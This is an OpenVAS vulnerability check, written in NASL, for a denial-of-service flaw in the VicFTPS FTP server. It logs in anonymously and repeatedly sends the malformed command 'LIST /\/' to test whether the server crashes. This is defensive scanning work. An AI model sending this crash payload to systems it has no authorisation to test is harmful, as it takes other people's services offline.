###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_vicftps_list_dos_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# VicFTPS LIST Command Denial of Service Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation allows attackers to execute arbitrary code, and can
  crash the affected application.
  Impact Level: Application";
tag_affected = "VicFTPS Version 5.0 and prior on Windows.";
tag_insight = "A NULL pointer dereference error exists while processing malformed arguments
  passed to a LIST command that starts with a '/\/' (forward slash, backward
  slash, forward slash).";
tag_solution = "No solution or patch is available as of 25th June, 2009. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://vicftps.50webs.com/";
tag_summary = "This host is running VicFTPS FTP Server which is prone to Denial
  of Service Vulnerability.";

if(description)
{
  script_id(900580);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-06-26 07:55:21 +0200 (Fri, 26 Jun 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2008-6829", "CVE-2008-2031");
  script_bugtraq_id(28967);
  script_name("VicFTPS LIST Command Denial of Service Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://milw0rm.com/exploits/6834");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/29943");

  script_description(desc);
  script_summary("Check for the Attack of VicFTPS Server");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ftp_func.inc");
include("version_func.inc");

vicPort = get_kb_item("Services/ftp");
if(!vicPort){
  vicPort = 21;
}

if(!get_port_state(vicPort)){
  exit(0);
}

if(safe_checks() || "VicFTPS" >!< get_ftp_banner(port:vicPort)){
  exit(0);
}

soc = open_sock_tcp(vicPort);
if(!soc){
  exit(0);
}

# Authenticate with anonymous user (Before crash)
if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous")){
  exit(0);
}

for(i = 0; i < 3; i++)
{
  cmd = "LIST /\/";
  ftp_send_cmd(socket:soc, cmd:cmd);
  sleep(5);
  ftp_close(soc);

  # Check for VicFTPS Service Status
  soc = open_sock_tcp(vicPort);
  if(!soc)
  {
     security_warning(vicPort);
     exit(0);
  }
  else
  {
    if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous"))
    {
      security_warning(vicPort);
      ftp_close(soc);
      exit(0);
    }
  }
}
